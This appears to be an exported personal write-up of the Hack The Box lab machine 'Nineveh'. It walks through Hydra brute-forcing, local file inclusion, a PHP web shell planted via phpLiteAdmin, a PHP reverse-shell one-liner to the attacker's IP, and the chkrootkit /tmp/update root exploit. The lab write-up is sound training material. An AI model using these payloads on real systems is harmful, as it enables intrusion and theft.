<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>nineveh</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#nineveh">nineveh</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http/https">http/https</a></li>
<ol>
<li><a href="#cert">cert</a></li>
<li><a href="#gobuster">gobuster</a></li>
<ol>
<li><a href="#http">http</a></li>
<li><a href="#https">https</a></li>
</ol>
</ol>
<li><a href="#hydra bf">hydra bf</a></li>
<ol>
<li><a href="#/departmnet">/departmnet</a></li>
<ol>
<li><a href="#homepage">homepage</a></li>
<ol>
<li><a href="#notes">notes</a></li>
<li><a href="#Local File Inclusion Vuln">Local File Inclusion Vuln</a></li>
</ol>
</ol>
<li><a href="#/db">/db</a></li>
<ol>
<li><a href="#pass">pass</a></li>
</ol>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#create database and table w/ malicious php system call">create database and table w/ malicious php system call</a></li>
<li><a href="#LFI to RCE">LFI to RCE</a></li>
<li><a href="#RCE through burp">RCE through burp</a></li>
<ol>
<li><a href="#reverse shell">reverse shell</a></li>
<ol>
<li><a href="#listener">listener</a></li>
</ol>
</ol>
</ol>
<li><a href="#privesc to root">privesc to root</a></li>
<ol>
<li><a href="#LinEnum.sh">LinEnum.sh</a></li>
<li><a href="#PSPY">PSPY</a></li>
<ol>
<li><a href="#pspy64">pspy64</a></li>
<li><a href="#custom ippsec procmon script">custom ippsec procmon script</a></li>
<ol>
<li><a href="#output">output</a></li>
</ol>
</ol>
<li><a href="#chkrootkit">chkrootkit</a></li>
<ol>
<li><a href="#exploit-db.com/exploits/33899">exploit-db.com/exploits/33899</a></li>
</ol>
<li><a href="#/tmp/update">/tmp/update</a></li>
</ol>
<li><a href="#additional foothold">additional foothold</a></li>
<ol>
<li><a href="#binwalk">binwalk</a></li>
<ol>
<li><a href="#nineveh.priv">nineveh.priv</a></li>
<li><a href="#nineveh.pub">nineveh.pub</a></li>
</ol>
<li><a href="#/etc/knockd">/etc/knockd</a></li>
<ol>
<li><a href="#nmap port knocking">nmap port knocking</a></li>
<li><a href="#nmap scan">nmap scan</a></li>
</ol>
<li><a href="#ssh">ssh</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>nineveh</u></b></h1><img alt="images/639-1.png" src="images/639-1.png"/><br/><img alt="images/639-2.png" src="images/639-2.png"/></div>
</body></html><div class="page" id="nineveh"><h1><b><u>nineveh</u></b></h1><img alt="images/639-1.png" src="images/639-1.png"/><br/><img alt="images/639-2.png" src="images/639-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/638-1.png" src="images/638-1.png"/><br/><span style="color:#24ff00;">nmap shows </span><span style="color:#ffff00;">nineveh</span><span style="color:#24ff00;"> is running </span><br/><span style="color:#ffa500;">http</span> service <span style="color:#ffa500;">Apache 2.4.18</span> on port <span style="color:#ffa500;">80</span> <br/><span style="color:#ffa500;">https</span> service <span style="color:#ffa500;">Apache 2.4.18</span> on port <span style="color:#ffa500;">443</span></div>
<div class="page" id="http/https"><h1><b><u>http/https</u></b></h1><span style="color:#ffa500;">http</span><span style="color:#24ff00;"> returns us a generic webpage</span><br/><img alt="images/1966-1.png" src="images/1966-1.png"/><br/><br/><br/><span style="color:#24ff00;">We have to dl the SSL cert to access </span><span style="color:#ffff00;">nineveh's </span><span style="color:#24ff00;">webpage on port </span><span style="color:#ffa500;">443</span><span style="color:#24ff00;">, lets take download it and look at its details</span><br/><img alt="images/1966-2.png" src="images/1966-2.png"/><br/><img alt="images/1966-3.png" src="images/1966-3.png"/><br/><br/><br/><img alt="images/1966-4.png" src="images/1966-4.png"/></div>
<div class="page" id="cert"><h1><b><u>cert</u></b></h1><span style="color:#24ff00;">certs files have the potential of containing valuable information about the box in question and is worth skimming through </span><br/><img alt="images/645-1.png" src="images/645-1.png"/><br/><br/><br/>E = admin@nineveh.htb  ‚Üê <span style="color:#ffff00;">admin</span> user on the box<br/>CN = nineveh.htb<br/>OU = Support<br/>O = HackTheBox Ltd<br/>L = Athens<br/>ST = Athens<br/>C = GR</div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><span style="color:#24ff00;">since both </span><span style="color:#ffa500;">http</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">https</span><span style="color:#24ff00;"> services are running we're going to run </span><span style="color:#ffa500;">gobuster</span><span style="color:#24ff00;"> to directory bust both services and see what interesing files are discovered </span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><span style="color:#ffa500;">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43</span><br/><img alt="images/641-1.png" src="images/641-1.png"/><br/><br/><span style="color:#ffa500;">/department/login.php</span><span style="color:#24ff00;"> Standard login page <br/>lets brute force the login on </span><span style="color:#ffa500;">hydra</span><br/><img alt="images/641-2.png" src="images/641-2.png"/><br/><br/><span style="color:#24ff00;">No luck</span> <span style="color:#24ff00;">visiting </span><span style="color:#ffa500;">/server-status</span><br/><img alt="images/641-3.png" src="images/641-3.png"/></div>
<div class="page" id="https"><h1><b><u>https</u></b></h1><span style="color:#ffa500;">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u 10.10.10.43 -k</span><br/><span style="color:#ffa500;">-k </span><span style="color:#24ff00;">to bypass ssl cert</span><br/><img alt="images/644-1.png" src="images/644-1.png"/><br/><br/><span style="color:#24ff00;">PHPlite admin login page</span><br/><img alt="images/644-2.png" src="images/644-2.png"/><br/><img alt="images/644-3.png" src="images/644-3.png"/><br/><br/><br/><span style="color:#ffa500;">/Server-status </span><span style="color:#24ff00;">is Forbidden</span><br/><img alt="images/644-4.png" src="images/644-4.png"/><br/><br/><br/><span style="color:#ffa500;">/secure_notes</span><span style="color:#24ff00;"><br/>Very peculuar picture.<br/>maybe some steg is involved in the metadata for us to extract</span><br/><img alt="images/644-5.png" src="images/644-5.png"/><br/></div>
<div class="page" id="hydra bf"><h1><b><u>hydra bf</u></b></h1><span style="color:#24ff00;">there are 2 different webpages on </span><span style="color:#ffa500;">http</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">https</span><span style="color:#24ff00;"> with logins we can brute force here, since both webservers are not commercial of the shelf software its safe to assume there no </span><span style="color:#ffa500;">fail2ban</span><span style="color:#24ff00;"> safety measure in place, but always be weary and have a backup plan if you get </span><span style="color:#ff0000;">ip banned </span><span style="color:#24ff00;">in your attempts to brute force an online login<br/><br/><br/><br/></span></div>
<div class="page" id="/departmnet"><h1><b><u>/departmnet</u></b></h1><img alt="images/657-1.png" src="images/657-1.png"/><br/><br/><span style="color:#ffa500;">hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/probable-v2-top12000.txt 10.10.10.43 http-post-form "/department/login.php=username^USER^&amp;password=^PASS^:invalid: -t 64</span><br/><br/><br/><span style="color:#24ff00;">where<br/></span><span style="color:#ffa500;">-l</span><span style="color:#24ff00;"> is </span><span style="color:#ffa500;">user</span><br/><span style="color:#ffa500;">-P</span><span style="color:#24ff00;"> is the password list </span><span style="color:#ffa500;">probable-v2-top12000.txt</span><br/><span style="color:#ffa500;">10.10.10.43</span><span style="color:#24ff00;"> is the our victim IP<br/></span><span style="color:#ffa500;">http-post-form</span><span style="color:#24ff00;"> since our login form is a post request<br/>then the </span><span style="color:#ffa500;">login page, username &amp; password parameters and a failed authentication attempt string server response</span><span style="color:#24ff00;">, all wrapped in quotes and separated by colons<br/></span><span style="color:#ffa500;">-t</span><span style="color:#24ff00;"> for threads</span><br/><br/><img alt="images/657-2.png" src="images/657-2.png"/><br/><br/><br/><br/><span style="color:#24ff00;">hydra successfully finds our </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;"> password as</span> <span style="color:#ffff00;">1q2w3e4r5t</span><br/><img alt="images/657-3.png" src="images/657-3.png"/></div>
<div class="page" id="homepage"><h1><b><u>homepage</u></b></h1><span style="color:#24ff00;">user </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;"> pass </span><span style="color:#ffff00;">1q2w3e4r5t</span><span style="color:#24ff00;">, lets login</span><br/><br/><img alt="images/658-1.png" src="images/658-1.png"/><br/><br/><span style="color:#24ff00;">Nothing much here so lets check the notes tab </span><img alt="images/658-2.png" src="images/658-2.png"/></div>
<div class="page" id="notes"><h1><b><u>notes</u></b></h1><span style="color:#24ff00;">if we check the url, we see that the webserver may be vulnerable to local file inclusion </span><span style="color:#ffff00;">(LFI)</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/660-1.png" src="images/660-1.png"/><br/><a href="http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt">http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt</a><br/><img alt="images/660-2.png" src="images/660-2.png"/><br/>The webpage lists the following<br/>‚Ä¢ Have you fixed the login page yet! hardcoded username and password is really bad idea!<br/><br/>‚Ä¢ check your secret folder to get in! figure it out! this is your challenge<br/><br/>‚Ä¢ Improve the db interface.<br/><span style="color:#ffff00;">~amrois</span> <span style="color:#ffa500;">&lt;--potential username</span><br/></div>
<div class="page" id="Local File Inclusion Vuln"><h1><b><u>Local File Inclusion Vuln</u></b></h1><span style="color:#24ff00;">It is safe to assume the webserver has a LFI vulnerability due to a notes variable that points to the location of the file the webpage displays </span><br/><img alt="images/512-1.png" src="images/512-1.png"/><br/><br/><br/><span style="color:#24ff00;">Since most webservers are run within the </span><span style="color:#ffa500;">/var/www/html</span><span style="color:#24ff00;"> directory, lets try to find and list the /</span><span style="color:#ffa500;">etc/passwd </span><span style="color:#24ff00;">file through the LFI</span><br/><br/><span style="color:#ffa500;">../../../../../../../etc/passwd</span><br/><img alt="images/512-2.png" src="images/512-2.png"/><br/><a href="http://10.10.10.43/department/manage.php?notes=../../../../../../../etc/passwd">http://10.10.10.43/department/manage.php?notes=../../../../../../../etc/passwd</a><br/>No Note is selected. is the message we get, lets try another LFI string<br/><img alt="images/512-3.png" src="images/512-3.png"/><br/><br/><span style="color:#24ff00;">we see the webserver uses </span><span style="color:#ffa500;">phpinclude() </span><span style="color:#24ff00;">to grab local files but we failed the file path, seems the site is vulnerable to LFI!</span><br/><img alt="images/512-4.png" src="images/512-4.png"/><br/><img alt="images/512-5.png" src="images/512-5.png"/><br/><span style="color:#24ff00;">we also see that the</span><span style="color:#ffa500;"> manage.php</span><span style="color:#24ff00;"> code that is handling our URL web requests is located in </span><span style="color:#ffa500;">/var/www/html/department</span><span style="color:#24ff00;"> directory, which means the webserver's working directory is approximately</span><span style="color:#ffff00;"> 4 directories</span><span style="color:#24ff00;"> deep within the box </span><br/><span style="color:#24ff00;">we can use this info to properly guess how many </span><span style="color:#ffff00;">directories</span><span style="color:#24ff00;"> we need to backtrack out of to get to the</span><span style="color:#ffa500;"> / </span><span style="color:#24ff00;">directory!</span><br/><br/><br/><span style="color:#24ff00;">Bingo! we gotthe webserver to list </span><span style="color:#ffa500;">/etc/passwd</span><span style="color:#24ff00;"> for us</span><br/><a href="http://10.10.10.43/department/manage.php?notes=/ninevehNotes../../../etc/passwd">http://10.10.10.43/department/manage.php?notes=/ninevehNotes../../../etc/passwd</a><br/><img alt="images/512-6.png" src="images/512-6.png"/><br/><br/><span style="color:#24ff00;">When it comes to </span><span style="color:#ffff00;">LFIs</span><span style="color:#24ff00;">, you usually need to chain it to another vulnerability in order to get remote code execution. Therefore, lets start enumerating the next port to see if I can find another vulnerability that I can chain this one to.</span><br/></div>
<div class="page" id="/db"><h1><b><u>/db</u></b></h1><span style="color:#24ff00;">this hydra brute force willl be nearly the same command as for http except we use an </span><span style="color:#ffa500;">HTTPS-post-form</span><br/><br/><br/><img alt="images/656-1.png" src="images/656-1.png"/><br/><br/><span style="color:#ffa500;"><br/>hydra -l admin -P /usr/share/wordlists/Seclists/Passwords/probable-v2-top12000.txt https-post-form ‚Äú/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In:Incorrect‚Äù</span><br/><img alt="images/656-2.png" src="images/656-2.png"/><br/><br/><span style="color:#24ff00;">hydra successfully finds our </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;"> password as</span> <span style="color:#ffff00;">password123</span><br/><img alt="images/656-3.png" src="images/656-3.png"/></div>
<div class="page" id="pass"><h1><b><u>pass</u></b></h1><span style="color:#24ff00;">revisiting the </span><span style="color:#ffa500;">phpLiteAdmin</span><span style="color:#24ff00;"> login page:</span><br/><img alt="images/659-1.png" src="images/659-1.png"/><br/><br/><span style="color:#24ff00;">we can login with our newly brute-forced password</span> <span style="color:#ffff00;">password123</span><br/><img alt="images/659-2.png" src="images/659-2.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">Given what we have so far, </span><span style="color:#ffff00;">nineveh</span><span style="color:#24ff00;"> has a </span><span style="color:#ffa500;">Local file inclusion</span><span style="color:#24ff00;"> exploit and </span><span style="color:#ffa500;">weak passwords</span><span style="color:#24ff00;">, lets see if we can get an initial foothold through their </span><span style="color:#ffff00;">phplite</span><span style="color:#24ff00;"> database we logged into:<br/><br/></span><img alt="images/664-1.png" src="images/664-1.png"/><br/><br/>lets see if <span style="color:#ffa500;">searchsploit</span><span style="color:#24ff00;"> has anything<br/></span><img alt="images/664-2.png" src="images/664-2.png"/><br/><br/><span style="color:#ffa500;">Remote PHP code execution </span><span style="color:#24ff00;">seems likely on this box, lets see what the exploit does:<br/></span><img alt="images/664-3.png" src="images/664-3.png"/><br/><br/><img alt="images/664-4.png" src="images/664-4.png"/><br/>This is exactly the vulnerability I was hoping to find! This vulnerability allows me to drop a malicious file on the server and the LFI vulnerability we found earlier allows me to call and execute my malicious file.<br/><br/>1. Vulnerability is pretty straight forward, we first have to create our own <span style="color:#ffa500;">database</span><span style="color:#24ff00;"> on </span><span style="color:#ffff00;">phpliteadmin</span><span style="color:#24ff00;"><br/>2. create a </span><span style="color:#ffa500;">table</span><span style="color:#24ff00;"> and write in some </span><span style="color:#ffa500;">malicious php code</span><span style="color:#24ff00;"><br/>3.</span><span style="color:#ffa500;"> run it</span><span style="color:#24ff00;"> through our browser thanks to the nineveh's </span><span style="color:#ffa500;">LFI vulnerability</span><br/></div>
<div class="page" id="create database and table w/ malicious php system call"><h1><b><u>create database and table w/ malicious php system call</u></b></h1><span style="color:#24ff00;">Lets create a new database on phpliteadmin called random.php and add php code execution to a field inside it:<br/></span><img alt="images/665-1.png" src="images/665-1.png"/><img alt="images/665-2.png" src="images/665-2.png"/><br/><br/>and drop <span style="color:#ffa500;">&lt;?php echo system($_REQUEST ['st0ve']); ?&gt;</span><span style="color:#24ff00;"> in the variable as a text field<br/></span><img alt="images/665-3.png" src="images/665-3.png"/><br/><br/>after we create we get <br/><img alt="images/665-4.png" src="images/665-4.png"/><br/><br/>and we see the path to our php code in <span style="color:#ffa500;">/var/tmp/random.php</span><span style="color:#24ff00;">:<br/></span><img alt="images/665-5.png" src="images/665-5.png"/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="LFI to RCE"><h1><b><u>LFI to RCE</u></b></h1><span style="color:#24ff00;">Lets give code execution from our LFI database path a try:</span><br/><br/><br/><img alt="images/666-1.png" src="images/666-1.png"/><br/><a href="http://10.10.10.43/department/manage.php?notes=/ninevehNotes../../../var/tmp/random.php&amp;st0ve=ls">http://10.10.10.43/department/manage.php?notes=/ninevehNotes../../../var/tmp/random.php&amp;st0ve=ls</a><br/><img alt="images/666-2.png" src="images/666-2.png"/><br/><span style="color:#24ff00;">We got </span><span style="color:#ffa500;">RCE</span><span style="color:#24ff00;">! next lets pass it through </span><span style="color:#ffa500;">burp</span><span style="color:#24ff00;"> </span><span style="color:#ffa500;">suite</span><span style="color:#24ff00;"> to make our RCE more convenient:</span><br/></div>
<div class="page" id="RCE through burp"><h1><b><u>RCE through burp</u></b></h1><span style="color:#24ff00;">burp captures the following get request we get when navigate to </span><br/><span style="color:#ffa500;">10.10.10.43/department/manage.php?notes=/ninevehNotes../../../../var/tmp/shell.php&amp;st0ve=ls</span><br/><img alt="images/668-1.png" src="images/668-1.png"/><br/><br/><span style="color:#24ff00;">and the server response embedded with our executed php command</span><br/><img alt="images/668-2.png" src="images/668-2.png"/><br/><br/><span style="color:#24ff00;">Lets switch </span><span style="color:#ffa500;">GET</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">POST</span><span style="color:#24ff00;"> to make our command execution more seamless</span><br/><img alt="images/668-3.png" src="images/668-3.png"/><br/><br/><span style="color:#24ff00;">this request does not execute code on the server but if we tweak a few things we can get it to work, lets move the </span><span style="color:#ffa500;">LFI</span><span style="color:#24ff00;"> up to the </span><span style="color:#ffa500;">POST</span><br/><img alt="images/668-4.png" src="images/668-4.png"/> to <img alt="images/668-5.png" src="images/668-5.png"/><br/><br/>and leave <img alt="images/668-6.png" src="images/668-6.png"/><br/><br/><span style="color:#ffff00;">voila</span><span style="color:#24ff00;"> we have our </span><span style="color:#ffa500;">RCE</span><span style="color:#24ff00;"> through a </span><span style="color:#ffa500;">POST</span> <span style="color:#24ff00;">request</span><br/><img alt="images/668-7.png" src="images/668-7.png"/><br/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">now that we have RCE working, lets get a reverse shell on our attack machine<br/><br/></span><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey</a><span style="color:#24ff00;"> gives us a wide array of reverse shell commands, lets pick one off the site<br/></span><img alt="images/670-1.png" src="images/670-1.png"/><br/><br/>lets plug into burp and URL encode it<br/><span style="color:#ffa500;">php -r '$sock=fsockopen("10.10.14.62",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br/><img alt="images/670-2.png" src="images/670-2.png"/><br/><br/><br/></div>
<div class="page" id="listener"><h1><b><u>listener</u></b></h1><br/><img alt="images/671-1.png" src="images/671-1.png"/><br/><img alt="images/671-2.png" src="images/671-2.png"/><span style="color:#24ff00;"><br/><br/>got it! lets spawn and shell with </span><span style="color:#ffa500;">python3</span><span style="color:#24ff00;"> and get tab auto completion with</span><span style="color:#ffa500;"> stty raw -echo</span><span style="color:#24ff00;"> and foreground the reverse shell<br/></span><span style="color:#ffa500;">python3 -c ‚Äòimport pty;pty.spawn("/bin/bash")‚Äô<br/>ctrl+z </span><span style="color:#24ff00;">to background the shell session</span><span style="color:#ffa500;"><br/>stty raw -echo </span><span style="color:#24ff00;">to implement tab autocomplete</span><span style="color:#ffa500;"><br/>fg</span> <span style="color:#24ff00;">to foreground the shell session back<br/></span><img alt="images/671-3.png" src="images/671-3.png"/><br/><br/><img alt="images/671-4.png" src="images/671-4.png"/><br/>finally, import <span style="color:#ffa500;">export TERM=xterm </span><span style="color:#24ff00;">so we can </span><span style="color:#ffa500;">clear</span><span style="color:#24ff00;"> the screen<br/></span></div>
<div class="page" id="privesc to root"><h1><b><u>privesc to root</u></b></h1><span style="color:#24ff00;">lets download </span><span style="color:#ffa500;">LinEnum.sh </span><span style="color:#24ff00;">to our victim to start off our privilege escalation enumeration</span><br/><br/><span style="color:#24ff00;">set up our server<br/></span><img alt="images/672-1.png" src="images/672-1.png"/><br/><br/>wget linEnum.sh<br/><img alt="images/672-2.png" src="images/672-2.png"/><br/><br/>give it execute permissions and run it<br/><img alt="images/672-3.png" src="images/672-3.png"/></div>
<div class="page" id="LinEnum.sh"><h1><b><u>LinEnum.sh</u></b></h1><span style="color:#24ff00;">we see </span><span style="color:#ffa500;">SSH</span><span style="color:#24ff00;"> is open but is listening on localhost! interesting but not relevant at the moment, lets keep this as a find</span><br/><br/><img alt="images/673-1.png" src="images/673-1.png"/><br/><span style="color:#24ff00;"><br/>strange directory in </span><span style="color:#ffa500;">/call/report</span><br/><img alt="images/673-2.png" src="images/673-2.png"/><br/><br/>checking report we see theres a job being produected every minute (<span style="color:#ffa500;">cron job</span><span style="color:#24ff00;">)</span></div>
<div class="page" id="PSPY"><h1><b><u>PSPY</u></b></h1><span style="color:#24ff00;">Lets download process spy and see if there anything we notice being run on the background of the machine, its github is <br/></span><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><span style="color:#24ff00;"> (just get the binaries)<br/><br/>lets upload and run it on our victim</span><br/><img alt="images/674-1.png" src="images/674-1.png"/><br/><br/></div>
<div class="page" id="pspy64"><h1><b><u>pspy64</u></b></h1><span style="color:#24ff00;">every minute a process called </span><span style="color:#ffa500;">chkrootkit</span><span style="color:#24ff00;"> runs</span><br/><br/><img alt="images/676-1.png" src="images/676-1.png"/><br/>...<br/><img alt="images/676-2.png" src="images/676-2.png"/><br/><br/><br/></div>
<div class="page" id="custom ippsec procmon script"><h1><b><u>custom ippsec procmon script</u></b></h1><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> wrote a custom </span><span style="color:#ffa500;">process spy</span><span style="color:#24ff00;"> script that might be a little easier to grasp which ill include and run here:<br/><br/></span><img alt="images/683-1.png" src="images/683-1.png"/><br/><br/><img alt="images/683-2.png" src="images/683-2.png"/><br/><br/>what this does is grab a list of every process thats running<br/>then grab a process of every NEW process thats running,<br/>diff the results to see processes that leave the list<br/>then sleep and repeat<br/><br/><br/><br/><br/></div>
<div class="page" id="output"><h1><b><u>output</u></b></h1><span style="color:#24ff00;">we notice </span><span style="color:#ffa500;">chkrootkit</span><span style="color:#24ff00;"> being run every minute with this script as well</span><br/><br/><img alt="images/685-1.png" src="images/685-1.png"/></div>
<div class="page" id="chkrootkit"><h1><b><u>chkrootkit</u></b></h1><img alt="images/677-1.png" src="images/677-1.png"/><br/><br/><span style="color:#24ff00;">Every minute or so the </span><span style="color:#ffa500;">chkrootkit</span><span style="color:#24ff00;"> is being run. I‚Äôve never seen that on a machine before so I googled it and found out that it is a program intended to help system administrators check their system for known rootkits. Next, I googled ‚Äú</span><span style="color:#ffa500;">chkrootkit privilege escalation</span><span style="color:#24ff00;">‚Äù and landed on this exploit..3<br/></span><a href="https://www.exploit-db.com/exploits/33899">https://www.exploit-db.com/exploits/33899</a><span style="color:#24ff00;"><br/><br/>or mirror it with<br/></span><span style="color:#ffa500;">searchsploit -m /linux/local/33899,txt</span>a</div>
<div class="page" id="exploit-db.com/exploits/33899"><h1><b><u>exploit-db.com/exploits/33899</u></b></h1>We just found a serious vulnerability in the chkrootkit package, which<br/>may allow local attackers to gain root access to a box in certain<br/>configurations (/tmp not mounted noexec).<br/><br/>The vulnerability is located in the function slapper() in the<br/>shellscript chkrootkit:<br/><br/>#<br/># SLAPPER.{A,B,C,D} and the multi-platform variant<br/>#<br/>slapper (){<br/>   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"<br/>   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \<br/>   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a<br/>   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "<br/>   OPT=-an<br/>   STATUS=0<br/>   file_port=<br/><br/>   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}"&gt;<br/>/dev/null 2&gt;&amp;1<br/>      then<br/>      STATUS=1<br/>      [ "$SYSTEM" = "Linux" ] &amp;&amp; file_port=`netstat -p ${OPT} | \<br/>         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |<br/>tr -d :`<br/>   fi<br/>   for i in ${SLAPPER_FILES}; do<br/>      if [ -f ${i} ]; then<br/>         file_port=$file_port $i<br/>         STATUS=1<br/>      fi<br/>   done<br/>   if [ ${STATUS} -eq 1 ] ;then<br/>      echo "Warning: Possible Slapper Worm installed ($file_port)"<br/>   else<br/>      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi<br/>         return ${NOT_INFECTED}<br/>   fi<br/>}<br/><br/><br/>The line 'file_port=$file_port $i' will execute all files specified in<br/>$SLAPPER_FILES as the user chkrootkit is running (usually root), if<br/>$file_port is empty, because of missing quotation marks around the<br/>variable assignment.<br/><br/>Steps to reproduce:<br/><br/>- Put an executable file named 'update' with non-root owner in /tmp (not<br/>mounted noexec, obviously)<br/>- Run chkrootkit (as uid 0)<br/><br/>Result: The file /tmp/update will be executed as root, thus effectively<br/>rooting your box, if malicious content is placed inside the file.<br/><br/>If an attacker knows you are periodically running chkrootkit (like in<br/>cron.daily) and has write access to /tmp (not mounted noexec), he may<br/>easily take advantage of this.<br/><br/><br/>Suggested fix: Put quotation marks around the assignment.<br/><br/>file_port="$file_port $i"<br/><br/><br/>I will also try to contact upstream, although the latest version of<br/>chkrootkit dates back to 2009 - will have to see, if I reach a dev there.</div>
<div class="page" id="/tmp/update"><h1><b><u>/tmp/update</u></b></h1><span style="color:#24ff00;">Steps to reproduce:<br/><br/>- Put an </span><span style="color:#ffff00;">executable file</span><span style="color:#24ff00;"> named '</span><span style="color:#ffff00;">update</span><span style="color:#24ff00;">' with non-root owner in </span><span style="color:#ffa500;">/tmp</span><span style="color:#24ff00;"> (not<br/>mounted noexec, obviously)<br/>- Run chkrootkit (as uid 0)<br/><br/>Result: The file </span><span style="color:#ffa500;">/tmp/update</span><span style="color:#24ff00;"> will be executed as </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">, thus effectively<br/>rooting your box, if malicious content is placed inside the file.<br/><br/></span><br/><img alt="images/679-1.png" src="images/679-1.png"/><br/><img alt="images/679-2.png" src="images/679-2.png"/><br/><br/><span style="color:#24ff00;">wait about a minute and...we have root!<br/></span><img alt="images/679-3.png" src="images/679-3.png"/><br/><br/></div>
<div class="page" id="additional foothold"><h1><b><u>additional foothold</u></b></h1><span style="color:#24ff00;">remember that </span><span style="color:#ffa500;">/secure-notes</span><span style="color:#24ff00;"> directory we found from our gobuster scan? turns out there's more than meets the eye</span><br/><img alt="images/681-1.png" src="images/681-1.png"/><br/><br/><span style="color:#24ff00;">First things first, move the picture into our working directory:</span><br/><img alt="images/681-2.png" src="images/681-2.png"/></div>
<div class="page" id="binwalk"><h1><b><u>binwalk</u></b></h1><span style="color:#24ff00;">we can use </span><span style="color:#ffa500;">binwalk</span><span style="color:#24ff00;"> to check for any files hidden within the picture</span><br/><img alt="images/653-1.png" src="images/653-1.png"/><br/><br/><span style="color:#24ff00;">we see that theres a </span><span style="color:#ffff00;">TAR</span><span style="color:#24ff00;"> archive written in Z lib compressed data so this is probably a </span><span style="color:#ffff00;">GZIP</span><span style="color:#24ff00;"> inside the image<br/></span><span style="color:#ffa500;">-Me </span><span style="color:#24ff00;">means </span><span style="color:#ffa500;">binwalk</span><span style="color:#24ff00;"> will run itself on everything it extracts:</span><br/><img alt="images/653-2.png" src="images/653-2.png"/><br/><span style="color:#24ff00;">see we have a public key and private key file </span><br/></div>
<div class="page" id="nineveh.priv"><h1><b><u>nineveh.priv</u></b></h1><span style="color:#24ff00;">we get a leaked private key! but who is it for?</span><br/><br/><img alt="images/654-1.png" src="images/654-1.png"/></div>
<div class="page" id="nineveh.pub"><h1><b><u>nineveh.pub</u></b></h1><span style="color:#24ff00;">and its corresponding public key</span><br/><br/><img alt="images/655-1.png" src="images/655-1.png"/></div>
<div class="page" id="/etc/knockd"><h1><b><u>/etc/knockd</u></b></h1><span style="color:#24ff00;">Back when we ran </span><span style="color:#ffa500;">LinEnum</span><span style="color:#24ff00;">, it reported that </span><span style="color:#ffff00;">port 22</span><span style="color:#24ff00;"> was listening on localhost although </span><span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> didn‚Äôt report the port as open.<br/>It turns out that there is a technique known as</span><span style="color:#ffff00;"> port knocking </span><span style="color:#24ff00;">used to </span><span style="color:#ffff00;">externally open ports on a firewall </span><span style="color:#24ff00;">by generating a connection attempt on a set of pre-specified closed ports. <br/>Once a correct sequence of connection attempts is received, the </span><span style="color:#ffff00;">firewall rules are dynamically modified</span><span style="color:#24ff00;"> to allow the host which sent the connection attempts to connect over specific port(s).</span><br/><br/><span style="color:#24ff00;">First the file we need is to check on this is located in </span><span style="color:#ffa500;">/etc/knockd.conf</span><br/><img alt="images/667-1.png" src="images/667-1.png"/><span style="color:#24ff00;"><br/>The file says that the </span><span style="color:#ffa500;">SSH</span><span style="color:#24ff00;"> port opens after sending a TCP packet to the ports </span><span style="color:#ffa500;">571, 290 and 911</span><span style="color:#24ff00;"> in </span><span style="color:#ffff00;">sequence</span><span style="color:#24ff00;">.<br/><br/>Lets try that out:</span><br/></div>
<div class="page" id="nmap port knocking"><h1><b><u>nmap port knocking</u></b></h1><span style="color:#24ff00;">a simple bash script that will ‚Äòknock‚Äô on ports 571, 290 and 911 </span><br/><br/><br/><span style="color:#ffa500;">for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43 &amp;&amp; sleep 1; done</span><br/><span style="color:#ffa500;">Pn</span><span style="color:#24ff00;"> to skip host discovery<br/></span>-<span style="color:#ffa500;">-max-retries=0</span><span style="color:#24ff00;"> to prevent any probe retransmissions</span><br/><img alt="images/686-1.png" src="images/686-1.png"/><br/><br/><img alt="images/686-2.png" src="images/686-2.png"/></div>
